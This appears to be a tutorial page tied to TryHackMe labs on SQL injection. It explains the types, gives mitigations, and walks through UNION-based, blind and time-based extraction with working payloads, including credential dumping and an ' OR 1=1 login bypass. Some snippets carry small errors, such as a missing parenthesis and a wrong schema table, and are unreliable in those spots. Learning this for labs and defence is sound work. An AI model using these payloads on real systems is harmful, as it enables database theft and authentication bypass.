# SQL injections (SQLi)

[![sqlinjectionlm](../../../_badges/thm/sqlinjectionlm.svg)](https://tryhackme.com/room/sqlinjectionlm)
[![sqlilab](../../../_badges/thm/sqlilab.svg)](https://tryhackme.com/room/sqlilab)

<div class="row row-cols-md-2"><div>

Most websites are using SQL database to store records. Injections are possible, when a query to a database uses data from the user (ex: username), without escaping it, meaning that an attack why use some SQL code, instead of a username. This would allow a hacker to access the database, to steal/edit/delete data...

**Example of injectable PHP code**: this code is fetching a list of products matching the product name send by the client.

```php
$sql = "Select name,desc from product where name LIKE '%$name%'";
```

If the user enter the following payload (value) instead of a product name

```php
' UNION Select username,password FROM users-- -
```

Then, the SQL query that will be executed will be

```sql
Select name,desc from product where name LIKE '%' UNION Select username,password FROM users-- -%'
```

UNION is used to concatenate the results of two queries, here the first one return a list of products, while the second one return a list (username,password).
</div><div>

**How we created this payload:**

**Test `'`**: because the value in inside quotes, we need to close it.

```sql
Select name,desc from product where name LIKE '%'%'
```

The problem, is that now the query won't work, because we have a trailing `%'`. So, we comment the rest of the query with `' --`.

```sql
Select name,desc from product where name LIKE '%' --%'
```

The code above may not work on some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add "` -`", to ensure that there is a space giving us **`'-- -`**.

```sql
Select name,desc from product where name LIKE '%' -- -%'
```

Between `'` and `-- -`, we can write SQL code, through the syntax of the final query must be valid ✌️. In the example, we used "` UNION Select username,password FROM users`" to merge the results of two queries.
</div></div>

<hr class="sl">

## SQLInjections in practice

<div class="row row-cols-md-2"><div>

There are many scenarios in which a hacker will find a SQL injection. The example above was a **Union-based SQLi**.

<table class="table table-bordered table-striped border-dark"><thead>
<tr><th>Name</th><th>Description</th></tr>
</thead><tbody>

<tr><td class="text-center" colspan="2"><b>In-band SQLi</b> (same channel to attack, and gather results)</td></tr>

<tr><td>Error-based</td><td>The simplest SQL injection. The SQL errors are displayed to the user. The hacker can easily use it to adapt the query, and broke into the database.
</td></tr>

<tr><td>Union-based</td><td>An attacker use an injectable entrypoint returning a list of results, and append to them records fetched illegally.
</td></tr>

<tr><td class="text-center" colspan="2"><b>Blind/inferential SQLi</b> (observe the database response to map it)</td></tr>

<tr><td>Boolean-based</td><td>The attack will first look for a successful injectable query. Then, it will append to the working query a condition such as  "AND is the DBMS starting with 's'". If the query is successful, then it means the answer was "yes". Question by question, the hacker is mapping the database.
</td></tr>

<tr><td>Time-based</td><td>The attack add in the request a call to <code>sleep(n)</code> if successful. If the request take $n$ seconds more than usual, then the hacker will know that the query was successful.</td></tr>

<tr><td>Others</td><td>Out-of-band-based, Voice-based, Stacked queries-based...
</td></tr>
</tbody></table>
</div><div>

Mitigations

* Use **prepared requests** (statements), they are ensuring that parameters of your queries are not interpreted as SQL code
* **Input validation** or **escaping user input**: You can filter input, but you CAN'T rely on it, as you filter will _most likely_ be bypassed
* **Do not trust anyone** 📌. SQL injections may be delayed. You may do protect your login queries, but if the provided username is some SQL code, then any other request using the username may interpret it, hence you should secure every request, even if there are not handling data from the user, as they may later. You should use an API for better security.
</div></div>

<hr class="sr">

## Famous payloads

**Payloads** are the values that you are using the break into the database.

<div class="row row-cols-md-2"><div>

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) (2.6k ⭐)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) (42.3k ⭐)
</div><div>

* [SQLMap](../sqlmap/index.md) (25k ⭐) - automated tool 📌

</div></div>

<table class="table table-bordered table-striped border-dark mt-3">
<thead>
<tr><th>Name</th><th>SQL</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>Usual PoC</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>'</code><br><small>The query will fail as there would be 3 quotes,<br> and that would confirm that an injection is possible.</small></td></tr>

<tr><td>NoPassword</td><td><code>Select [...] where username='here' AND password='here' [...]</code></td><td><code>' OR 1=1 -- -</code><br><small>The query will bypass the check of the password,<br>if it was made in the query.<br>We use 1=1 for maximum compatibility.</small></td></tr>

<tr><td>Input box String</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>' code -- -</code></td></tr>

<tr><td>Input box Non-String</td><td><code>Select [...] where xxx=here [...]</code></td><td><code>'' code -- -</code></td></tr>

<tr><td>Update</td><td><code>Update [...] set x='here',y=[...]</code></td><td><code>',x=(code),y='</code></td></tr>
</tbody></table>

<div class="row row-cols-md-2 mt-4"><div>

* If there are client-side filters, then intercept the request (ex: Burp)

* If the developer was lazy, the "names" in the form, may be similar, or the name of columns in the database

</div><div>
</div></div>

<hr class="sl">

## Manual Union-based SQLi

<div class="row row-cols-md-2"><div>

**Union-based SQLi** can only be achieved is the two queries have the same number of attributes in the SELECT, as per the property of the UNION clause. Hence, we first need to find how many parameters there are in the unknown request. There are 2 ways

<details class="details-n">
<summary><b>error-based</b> using <code>UNION SELECT</code></summary>

```none
UNION SELECT NULL -- fail
UNION SELECT NULL, NULL -- fail
UNION SELECT NULL, NULL, NULL -- fail
UNION SELECT NULL, NULL, NULL, NULL -- OK
```

As the 4 query is successful, we know that there are 4 parameters in the select. Note that NULL is the most used, but you may use any value such as `1`, `2`...
</details>

<details class="details-n">
<summary><b>error-based</b> using <code>ORDER BY</code></summary>

`ORDER BY` can take an index, which is a shortcut for the $nth$ argument in the select. If you use an invalid $n$, then the requests fails.

```none
ORDER BY 1 -- fail
ORDER BY 2 -- fail
ORDER BY 3 -- fail
ORDER BY 4 -- OK
```
</details>

The second objective is to find the DBMS, and it's version, just to ensure that any following query is valid in the DBMS language. You can fetch the user too with `user()`.

```none
UNION SELECT @@version, NULL, NULL, NULL
UNION SELECT sqlite_version(), NULL, NULL, NULL
UNION SELECT VERSION(), NULL, NULL, NULL
UNION SELECT (SELECT banner FROM v$version), NULL, NULL, NULL
...
```

> Note that there may be an error at this point if the server was expecting the first value of the select to be an "int" (for instance). Simply move the call of `@@version/...`, until it's successful.
</div><div>

**Note**: functions available in MariaDB/MySQL, and PostgresSQL maybe

The third objective is to find the database name.

```none
UNION SELECT database(), NULL, NULL, NULL
```

The fourth objective is to find the tables. Note that the following query will return one result, but if your attack channel allow you to display more than one, then you may remove the `group_concat`.

```none
UNION SELECT group_concat(table_name), NULL, NULL, NULL FROM information_schema.tables WHERE TABLE_SCHEMA='database_name'
```

Then, you may want to know a column names given a table

```none
UNION SELECT group_concat(column_name), NULL, NULL, NULL FROM information_schema.columns WHERE TABLE_SCHEMA='database_name' AND TABLE_NAME='table_name'
```

Now, you have everything you need to dump all results.

```none
UNION SELECT group_concat(col1,":",col2 SEPARATOR '<br>'), NULL, NULL, NULL FROM database_name.table_name
```

<p class="mt-3"><b>Notes for SQLite</b></p>

```none
UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
UNION SELECT group_concat(col1 || ":" || col2, '<br>') [...]
```

</div></div>

<hr class="sr">

## Manual Error-based SQLi

<div class="row row-cols-md-2"><div>

You better be prepared, manual error-based SQLi may take QUITE some time, as you may have to iterate a lot of characters. Let's say you found the following GET form to be injectable. If you use "1", you can see a valid account, but if you return "0", you will see "page not found".

```none
GET /account?id=1
```

Then, your starting point will be

```none
GET /account?id=1' AND 1=0-- -
```

Now, even if the id is valid, you will see "page not found". If you use `1=1`, everything should work like before. That's how you will have to play with the request. When you got "page not found", it will mean that you condition failed, and bit-by-bit you will map the database. There are two well-known way to process

* Using LIKE <small>(work on text AND numbers)</small>

```none
WHERE text LIKE 'a%'
-- is text starting with 'a'
WHERE text LIKE '%0%'
-- do the text contains 0?
```

* Using SUBSTR, and ASCII/CAST

```none
WHERE ASCII(SUBSTR(text,1,1) = ASCII('a')
-- extract the the first character (pos=1, len=1)
-- of a text 'text'. Convert the character to ASCII
-- and, check if this is the same as the ASCII of 'a'
```

**Why?**: You would (obviously) want to go with LIKE, but it won't always work. For instance, the parameter may be transformed to lowerCase/upperCase according to what the programmer wants...

```none
-- find the ASCII (do it inside YOUR DBMS)
SELECT ASCII('A') -- 65

-- then use
WHERE ASCII(SUBSTR(text,1,1) = 65
-- some are using "65 to HEX" = X'41'
WHERE SUBSTR(text,1,1) = CAST(X'41' as char)
```

</div><div>

First, to avoid losing too much motivation, it may be better to test how many characters you are looking for. For instance, for the database name

```none
' AND LENGTH(database()) > 5 -- -
' AND LENGTH(database()) > 15 -- -
' AND LENGTH(database()) > 12 -- -
' AND LENGTH(database()) == 14 -- --
[...]
```

**Examples with LIKE**

Then, you can start. As everything is the same as for **Union-based SQLi**, and the process is the same for every text, I will only show an example with getting the database name.

```none
' AND database() LIKE '%' -- - // test, should always be true
' AND database() LIKE 'a%' -- - // starting
' AND database() LIKE 'b%' -- -
[...]
' AND database() LIKE 'm%' -- - // ok
' AND database() LIKE 'ma%' -- -
' AND database() LIKE 'mb%' -- -
[...]
' AND database() LIKE 'my_example' -- - // found 😢
```

Sometimes, there maybe more than one match. For instance, we could have a database starting with `my_`. In such case, to know if there are more databases like this, you have to exclude the one you found.

```none
' AND database()!='my_example' AND database() LIKE 'my_%' -- -
```

If the query returns true, you may have one more database to check up. Following here, I'm doing this

```none
-- fetch table name
' 1 IN (SELECT 1 FROM information_schema.tables WHERE table_schema = 'database_name' AND table_name like '%') -- -
[...]
-- fetch column name
' 1 IN (SELECT 1 FROM information_schema.tables WHERE table_schema = 'database_name' AND table_name='table_name' AND column_name LIKE '%') -- -
[...]
-- fetch values
' 1 IN (SELECT 1 FROM database_name.table_name WHERE column_name LIKE '%') -- -
```
</div></div>

<hr class="sl">

## Manual Time-based SQLi

<div class="row row-cols-md-2"><div>

This kind of SQLi is quite similar to **Error-based SQLi**, the only difference being that instead of using

```
UNION SELECT NULL
```

We will use

```
UNION SELECT SLEEP(5)
```
</div><div>

The SELECT is only applied on the elements returned after applying the WHERE, if there are none, then the SLEEP function won't be called, and if so, it the hacker didn't have to wait $n$ seconds, it will indicate that the where was false.

For instance, on a login page in which you don't know the credentials, you will most likely don't know if the query failed, there are too many possibilities as to why. But, using time-based SQLi, if the request take a fixed amount of time, you will be sure of the answer to your question.
</div></div>